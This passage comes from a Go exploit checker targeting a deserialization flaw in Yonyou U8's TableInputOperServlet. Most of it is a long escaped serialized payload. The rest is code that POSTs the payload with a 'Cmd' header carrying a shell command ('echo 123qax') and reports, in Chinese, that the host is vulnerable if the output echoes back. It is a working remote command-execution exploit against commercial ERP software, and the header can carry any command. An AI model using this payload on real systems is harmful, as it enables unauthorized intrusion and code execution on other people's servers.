fb\\x7d\\xc1x\\xad~\\xfe\\x99|\\xeb\\x83\\xa14\\xecb\\xa6\\x04\\x7f\\x8e\\xa9\\xd2\\x7dFcb\\xa6F-\\xcc\\xa7\\xcf\\x03R]\\x103\\xd4\\xbf\\xacV\\xbf\\xecq\\x8f\\xf4\\xcc\\xab\\\"\\x8d\\x0e\\xeb\\xd5\\xc7\\xcf\\xe5\\xb0\\xb1_\\xe8l\\x7b\\x9d\\xfa\\xfa\\x1ax\\xca\\x13\\xae\\x95\\xc1\\xc2A\\xac\\x18_\\xe8\\xd1q\\x8a\\xad\\xa7\\x1e\\xcdx\\x28\\x0f\\xa6\\\"?T\\xd9\\xf6\\x0e\\x94`\\x9eO\\xcf\\x19p\\xce\\xe0\\x1a\\xb3?\\xe7n\\xf1\\xb7\\xca;\\x85\\x0e\\xea\\xc0j6\\xe8r\\x7d\\xd7?yF?\\xec\\x17\\x8f\\xb3\\xe4\\xfd\\xe3\\\\\\xa0\\xa6\\xf3\\x7f\\xb0\\xd5\\xc3H\\xcfE\\xe8\\xa1M\\xcci\\xfe\\xe7\\xf1~\\xd5?\\x1f?\\xeb\\xa3\\xf6q\\x0e\\xdc\\xa6=\\x15z\\x1d\\xf8\\xa9\\x7f\\xe0\\xa7\\xc3y\\xff\\x7d\\xd6\\x17\\xeb\\xe8+7\\x1b\\x8b\\xcfM\\x8fg7>#\\xbc\\xf0\\x7b\\x99\\xd7\\x90\\x7b\\xbbgF2\\xf8\\x97\\xd3\\xe7R<\\x1fq\\x1e\\xef\\xf9\\xfc\\x15\\x7d\\x90W~\\x9a\\xcf\\xa2WG\\xbf\\xea$\\xd9\\xbdl\\xae\\x90\\xba\\x9d\\\"z\\xf4\\xf6\\xb9\\x17>O\\xb2>\\x89z:\\xb2\\xb8n\\xd3h\\xf6\\xf4\\\\\\x8cF\\xfc\\xac\\xb3\\xe4\\xf13\\x82k\\xc2\\x88mS\\x99p\\xe6\\xc2\\xe7\\xb2\\xce\\xcf\\xf3$*\\xd7\\x88<\\xa9Mee\\xfb\\xb9M\\x01?\\xa7&\\x9f\\xd0t\\x7bT\\xf6x\\xdd\\xe2'\\xd7\\xb1G\\x1a\\x09\\xd0S\\xa5Q\\x99;D\\x03\\xac\\xcd\\xfbD\\xb9d\\x8e5E\\xf1\\xba\\x05\\xf4\\xcaz\\x95L\\\\\\x9d\\xa8\\xf2\\xbeO\\x12\\xc8qB&\\xa9]\\x8c\\x1b\\x9ea\\x89j\\xb1 \\x8cZA\\x8c\\xda\\x9ajt\\xc7\\x10f\\x09\\xd1\\xd6j\\xf7aI3\\xeeJD\\xf6\\x94\\xfc\\x9a%x\\xef\\x7d\\xa8k\\x86gJx/\\x97C\\x92\\x9b\\xbe\\xaex\\x05\\xf0^\\xdb\\x29\\xdd\\xb8\\x9d\\xd2\\x09\\xa17X\\xb7\\x96\\x99\\x28\\xb8\\x96\\xaa\\xc2/\\xe1\\xaa7<\\xdf\\x92\\x1c\\xe4\\xc7eH\\xe2\\xc1\\x91h\\xe4\\x97S=G\\xd23=5c\\x82\\xabw%5w\\xebZ\\xba>K\\xa8\\xdb\\xf0BK\\x1a@F\\xb5O\\x0ad\\x29+\\xbdy \\xab\\xfc\\x28kG\\xb7\\xd2\\xdb\\x29\\x8d\\x8d\\xa9W\\x0e+\\x19\\x7f\\xc3T\\xb1&\\xfc\\\\\\xc44b\\x9d\\xa4\\xf4\\x92\\x1c\\x96\\x1f\\xd7\\x07\\xaf\\xac\\xc3\\x7fj\\x84\\xd7=\\xf3y\\xb8$\\x81\\xfa,\\x87U\\xcdX\\xe0=jr\\xd9\\x17\\x18y\\xab\\x0b\\x83,\\xe0\\xe4J\\x16~-\\xb3\\xe1\\xe1\\xc0\\xc6uj#|X\\xcf\\xd6#yi\\x90\\x83\\xf7C\\xcd\\xc8\\xf1\\x7b\\x17\\xef\\xef\\x1a^\\xd1\\x92\\x07\\xa9O=Q\\xcdQ\\x09Goe\\xac\\xb6\\xb6t\\x0a\\xd3u\\x8d\\x9a\\xa9\\x07\\x8d\\x02\\x89s\\x04V\\xb9\\x92W\\xfe\\xed*!mv\\xfeU\\xb32\\xf2oA\\x7b\\x8f\\x97\\xdf\\x18\\x91%\\xcfS^\\xc1\\x8eW\\xe4\\xd1\\xa4\\x0d?\\x96\\x9a~#\\xbd\\x17\\x80\\xbf!\\xeb\\x0b\\xa2iz?\\xef<\\x28\\xe3q\\x81$\\xffJi\\xfa\\xec\\xeb\\x07\\xf6\\xad\\xd2\\xd4\\xe7b\\xbe\\xd3g\\xd5\\xea\\x1a\\xe6\\x9a$\\x0b\\xd7nz\\x05]\\xac\\x19\\xbe\\xb6\\xd5\\xcfR\\xd4\\xba%\\xa8Q$i\\x08\\x9a\\xb6\\xa5T\\xaf\\xd2\\xf7lcg\\xe57R\\x1f\\x8c\\x8bl\\x8f\\x93\\xd2w\\xd8\\x9e\\x9c%\\x7b\\xe6\\x0d\\x89K\\x8bV~9\\xd3\\xc7\\x9d\\x92r\\x7d\\xa5\\x98\\xa1YC\\\\*\\xad\\xd0\\xd4\\x9a\\xbaY3\\x98n\\x05:=b\\xbaj\\xd37w\\xf6hM\\xd1\\xca|\\xe9\\xef\\xec_\\xec\\xec\\xd7\\x9a\\xe5\\xad/\\x8b;_ZR*\\xfb\\xa6\\x07\\xbc5\\xf0R\\x1b\\xdeX\\x11\\x9e6=\\xb7\\xdd\\x15b\\xc7\\xcf\\xb0\\xe6T\\x29\\x92\\xe2\\xc9\\x0d\\xaa't\\x91\\x90I\\x8e\\x01h\\xe8\\x1b\\x92\\xae\\xe96\\x11\\x0a\\x85m\\xaa&\\xa2D\\x9a.\\x8d\\x0cZ\\x92\\xd6\\xa6\\x91QQy\\x7dL\\xe5\\xf3l\\x9d\\xf3>\\xe4TvIv8\\xc9\\x7b\\xc4\\xc3\\x15Q\\x15\\xc0#\\xd5@\\x7d\\x10!i\\x09M\\xe0\\x0b\\xf0\\xa5;T-\\xd2I4\\xf8\\xfb\\x16\\xd4\\x931!C\\xf5D\\xe4I2\\xe8\\xce\\xa0\\x80t\\x0f%Bjq\\x92O\\xf8\\x0b\\x92\\x0a\\xaa\\x83\\x07\\x7d\\xa5\\x1c\\xcd=\\x9a\\x833\\xfe\\xcb\\xa8\\xebEZ\\xf1w\\x04\\xb5\\\"\\xd5\\x0c\\x08\\x97\\x0d\\xb6cM\\x0d\\x85j\\x89\\x1c\\x91\\xdc\\xa6k\\x83\\x0at\\xeb\\xc3D\\x05I\\xcb\\xdf\\x9f\\xd0%5\\x1djx\\xca\\x860+\\xdfz\\x28b\\xed\\x1a\\xdd\\x1a*X\\x16\\x05\\x8a\\xd29\\xf5C\\xb6\\xe0\\x16\\xd1\\x14>\\x7f7a\\xe5\\xa8I%4\\xed\\xbe\\xd8\\x10\\xfc1\\xac\\xc1Yz\\x83\\x14\\x1f\\xfe\\x82\\x1d\\xf7\\xf8\\xec\\xe9yR\\\"\\xe9\\xd6@1\\x0br\\xd42\\xe0\\x1f\\xe5\\x9a\\xbf\\xaai\\xb1\\x9f\\xdaF\\xa5\\x04\\xfb%\\x1c\\xaf;T\\x8e\\xd8O\\x0a\\xff\\xcf\\xfc\\x97\\xd0\\x145\\x1dy\\xc7\\xf7/\\xe1\\x0d\\xae\\xabDB\\x99\\x03\\xc3\\xebH\\x29\\x14\\xe1\\x81\\x02\\xec\\xe3\\x9a\\x98\\xc7n~\\xce\\xc6?T\\x92k\\\\Sm\\xfe,\\x7b\\xe0\\xc1\\x01@\\xbc9\\x00\\x82\\x1f\\xa1\\xec\\xc9\\xaa%\\x92\\x9b~\\xe3\\xe2Iw\\xfc\\x99\\x9fc\\xf2u\\xc2\\xdf\\xc5\\xdc^3\\xbf\\xb4`O\\xd6K\\xecN\\xcc\\xfax\\x01\\x99.\\\\\\xd27\\x1bUb\\xd9\\x97-\\x292\\x1b\\xc0_\\xe3\\xd2\\xa7\\xc6:\\x9c\\xc7\\x09]+\\xf7\\xa8\\x9f\\xf2e\\xbdZ-\\xaaS\\xe4\\xacr\\xffUR\\x19'rm\\xde\\x86ja$d\\x06\\x9a\\x86\\\\q\\xe1\\xa3\\xca\\x7bR\\xea\\x16\\xd7\\xfa\\xa6R\\x8ccO\\xa8\\x8ao'\\x95U\\x99\\xeb\\xeb\\x7b\\xe82\\xae\\x8c\\x17\\x17$'\\xe6-j\\xc6-j\\xd7\\xd2\\xeb\\xde\\xb1\\x0ef\\x95\\x1e\\xaaT[W\\xc9Xc_9\\x82.\\xe6V\\x17\\xd9\\x0c\\x1f*\\xef\\x1d\\xbaE>\\x99\\xef\\xe9!\\xe3\\x81\\xfa\\xa4,\\x92\\xd4\\xe6\\xad\\x8f\\xda\\x1e\\xb5\\xf9j'TgP\\xa2#.0\\xc3\\xd3 !\\x97C\\\\1\\xc4\\x9a\\xf1\\xed0\\x8eJmj\\x18\\x02<\\xfa4L\\xc4-7\\xbdv\\\".\\xf9\\xd1\\xaf\\xeb\\x89;*Ed\\x7b\\xe2\\x9a\\xf1\\x7bg\\x00\\x1a\\xa5k\\xba\\xf3$\\x84\\xcf!\\xcf\\x90\\x9a\\xa4\\xa7\\xb1\\xe1\\xe7\\x85|\\xe5~G\\xc34F\\xa9\\x0a\\x85E\\\"j]\\x13z*\\xf9\\x06\\xde7\\xbaf\\xe1\\x82\\xeb\\x82\\x10\\xbeR\\xadB\\x16li7\\x7d\\xf4\\x04aj\\x06j\\xae\\xda\\x98\\x12E\\xe9:\\xee\\xb5#\\x09~W\\xbb\\x09\\x87\\x0d\\xb8\\x9e\\xa0\\xbe\\xed\\xe5#\\xa7\\x0e\\xe3Ij\\xf0\\x15\\xefZ\\xdc\\x8fK$\\x99\\x9cw>\\xe7c\\x19\\xb5\\xc7@\\x9f\\x96\\\"\\x0a\\x0cZ\\xf1w\\x13\\xc0\\x86O\\x15\\xe5Q_\\xf0\\x93S<\\x02V\\x95\\x95~\\xa5\\xdc\\xdb\\x90\\x89X\\x8c\\xf4\\x02t\\xe8*\\xbec\\xd6\\x11\\x83\\xce\\x9c2Hf\\xb2\\xb5\\x0cJ\\x92\\xc7\\xd7\\xf4\\xf9\\xe8\\x0egN\\x8dqVf\\xda\\xf2\\xaa\\xdc\\x83\\xf3\\xfb\\xe0c\\xb5L\\xc6ZP\\xa3v1R\\x02\\xee3k\\x1ek\\xe6\\x18A\\xb3\\xf7\\x12\\xbf_g\\x7dZ\\xb8\\xefI\\xcd[q\\\"\\\\\\x9e\\x07z\\xab\\xb2\\x07\\x1ewx\\x8dZd\\xdf\\x90\\xa4r\\x0d\\x1d\\xb7\\xf3\\xbe\\xa2L\\xca\\\\\\xab\\xe7\\xedM\\xa8\\xa0\\x0e\\xde\\x00g\\x03\\xe0\\xac\\x06]<\\xbcw\\xd2\\xf7\\x1e\\xf5\\xe0\\xffaw\\xe0P\\x8f1\\xaf^\\x9b\\x7d\\xe6\\x8bW\\xbf\\x9dp\\xfd\\x1fq\\x7f\\xb2\\xb8\\xfe\\x8br\\x00\\xbej%_\\xbb\\x12\\x88\\x915Jc1m\\xcd\\x81\\x05\\xd5g<\\xcf\\xa0\\xd7\\x832\\x01\\x1f-\\xb9\\x12M_\\xc5\\xbd\\x18\\xf2\\xd0_1\\xcbhW\\x88a\\xdb\\xac\\xdf\\x87\\x1ad\\x86\\x889\\xee\\x7duAZh\\xda\\x907\\x90C\\xf5Q\\x97\\x91\\xaf\\xb1]\\xd9\\xbe\\x02\\xe2\\x11Y\\x0291xpH4S\\xff\\xa767\\xbc\\xbe%0\\xebT\\x1d\\xee\\xf1\\xe0W\\\"\\xcc0\\xb4\\x93\\xdd\\xc6z\\xbc\\xe2\\xb9\\x02\\x7b\\x1d\\xe1k\\x91\\x1c\\xea\\xfb\\xb4R\\x95s\\x1f\\x08\\xba\\x8d\\x84\\xe0z\\x8a\\xe8|\\x95\\x28\\x9c/\\xf8\\xac\\xdcR\\x93c\\x8a\\xcf\\xcdDh^VN&|\\xd5BJ?W|\\xec\\x96\\x1e\\x88\\x8a\\xf4\\xc0\\x93e%G\\x9a!-\\x18W\\xf3\\x04\\xf5\\xb4\\xaaP\\xc7\\x936L\\x1c\\x13\\xf2\\x05\\xb8\\xc6\\x8eK\\xaew\\x0b\\xae\\xeb\\xd5\\x88\\x96\\x09\\x92\\xae\\xae\\xd0\\xd2\\x90/\\xa8Z\\x84|Y\\xe2\\x9a\\x94$\\x8a\\x8c\\xcf\\xd0C:'\\xc3CY\\x84>5]\\x28\\x89,s\\x1dOX/|\\xd6\\x09\\x9f\\x19k\\xfc\\\\u\\x87\\xb5\\x9e\\xceX\\xe3\\xe1\\x92\\x8a\\xa3'\\xacm\\xf1\\x05\\xfb|\\xd3is<\\xfa\\xa6\\xe3\\xa3\\x97k\\x7d\\x8e\\xdf\\xa6\\xe1\\xa1\\x82\\x94\\x9aVe\\xb5\\xbe@\\x0d`?r\\x8cg\\xa9\\x9f\\xa1\\xfb`\\xc3s%bR\\xea_IY.^p_\\xe6\\xd8\\xb8\\xe9l\\xc6k\\x13\\x1bY`\\x09\\xe4\\x86;C\\xf9\\x13>\\xee#wJ\\xc0Ei==\\xff\\xaa\\x98\\xce\\x99Ok\\xee\\xb35\\xa9\\xfa\\xb8\\x86Yn\\xfc|\\x0d<\\xef\\xd2\\xb9R\\xdc\\xa8$\\xbe\\x82\\xa3\\x29\\xad\\x0f\\xba\\xca\\xfd\\x1es\\xe3bz~YLuE\\xbc\\x81\\x01I\\xc2\\x7d\\x8f1\\xda\\xebL.H-\\x9a\\x1e\\xe3\\x9b\\xe3\\xaf\\x9b\\x29\\xdeG\\x83-\\xde\\x07d\\x8e\\xe6i\\x8f\\x98r\\x1c\\xd1=\\x96\\xec\\xbf%\\xc7\\x03!\\xda\\xd5Q\\x8c\\xe9\\x03\\xbe\\xe6\\x0c\\xfe\\xf6\\\\'\\x95\\x7fW\\x02\\xfd>\\xef\\xa1\\x9f\\xd7\\x1d\\xaa\\x1a2\\x86V\\x9d\\x0a\\x86\\xc0zH]\\x92\\x07\\\\\\x15.H\\xc4T/\\xd2\\xd0\\x90\\xefH\\xd7\\xa9hH\\x15j\\xe8\\x14$\\xb2\\xcf\\x7d\\xf0\\x92kE\\xa3O\\xb3D\\x0eY\\xfe\\x95!a\\x82\\x09\\x29\\xf2d\\xe0\\xa4M\\xef\\x0d\\xe9\\x8aG0\\xe8\\xb3B\\xdc\\xe9=\\xe3\\xe0\\x16|\\x13y\\xcdq\\x7f \\xa9\\xff\\x18\\x7f\\xcc\\x0b\\x94d\\xbd\\x12\\xb3\\xd6\\x03\\xb0G\\x959\\x14\\x86\\xffF\\xb0u\\xac\\xf2,\\xf4\\xd4\\x1bP\\xad$\\xbe\\xde0\\x861\\x18\\x00\\xd33\\xaa\\x84\\xbbZ\\x88\\xc6\\xcf\\x16\\xa4\\x8c#4\\x02s\\x0c'\\xd4\\xd0\\x9f\\x940\\xdc\\xcd|\\xa6\\x9e\\xcd|\\x11\\xcf\\x98\\xbb\\xd9\\xad\\xf28\\xd7n\\xf0Z\\xd5\\x10\\x0b\\xa5e.K\\xa4\\xd4\\xcc\\xf1\\x7b\\xf0\\x18\\xa1A\\xbc\\x07-\\xe2U2\\x94\\xc7\\xb9\\xb9e\\xae\\xd3\\x19\\xfe\\xfei.\\x1c\\xa5\\xf3#\\xce\\x09\\xdb9\\xef!\\xfd\\x8c\\xb0T\\x81\\xf2\\xaa\\xb2\\x06\\x96\\x9b\\xf5\\xca\\xb5CuQi\\xf0\\xec\\x803\\xc5\\xcb\\xfd87Uy\\xee\\xdc\\xcd\\xa5\\xebY:[\\xa2\\x91D\\xfcjUP_\\x94\\x1c\\xd0\\x92\\xd5\\xfe*\\x7f\\xc9\\xc5\\xe9i\\x88\\x15\\x14\\xe4\\x99\\xf0\\x92*\\x7dz\\xe0\\x99pW\\x0b\\xd0#\\x15v\\x0d\\xbf<\\x05~\\xc49\\\"A\\xba\\x1b\\x7d$ \\xcf^\\x8a\\x10\\x09\\xe5\\xc9\\xf0\\xd1\\x88\\x94\\x0az\\xad\\x90\\x0d\\x0c\\x84F\\x04, \\xa7K\\xbeP\\x0c8\\xa9\\xa9\\xf3\\xefw\\xb4\\xc0_\\xa8\\x1e\\xfc\\xdf4\\xe8\\xc1S\\xd2\\x98>\\xa4\\x9d\\\\\\xc7\\x00\\xf8\\xf5\\xd7o?|\\xf9\\xe2\\x17!O^\\xf9\\x7d9~\\x7bz\\xfa\\x01\\xb4\\xcf\\x7f\\xcd\\xeaC|\\xf4C\\x97\\xff\\xa0\\xef\\xf1/\\x8f\\xf8\\xcd_|\\xf9\\x87\\x835\\x7b\\xf6\\xa3\\x9f\\xfb\\xe3?\\xf8\\xb7\\xbf\\xf2\\xd7\\xff\\xe3\\x17Go\\xd4\\xa3/\\xf9\\xaf\\x8c\\xd4\\xf4\\xaf\\xee\\xf4\\xa3\\x9f\\x8fGs7\\x1a\\x85\\xc1p5\\xdb\\xfe-\\xe1Q\\xf2g\\xf0\\xe3\\xc7\\xe9\\x9f\\x82\\xadV\\xff\\x07b\\xa7\\xd6L\\x8d8\\x00\\x00\")}}"
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":     UA,
		"Cmd":            "echo 123qax",
		"Content-Length": "20327",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(data).Post(url)

	if err != nil {
		color.Red.Println("[-] 用友 U8 TableInputOperServlet反序列化漏洞不存在")
		return
	}

	responseBody, err := resp.ToString()
	if err != nil {
		color.Red.Println("[-] Error reading response body")
		return
	}

	if resp.Status == "200 OK" && strings.Contains(responseBody, "123qax") {
		color.Green.Println("[+] 用友 U8 TableInputOperServlet反序列化漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 TableInputOperServlet反序列化漏洞不存在")
}
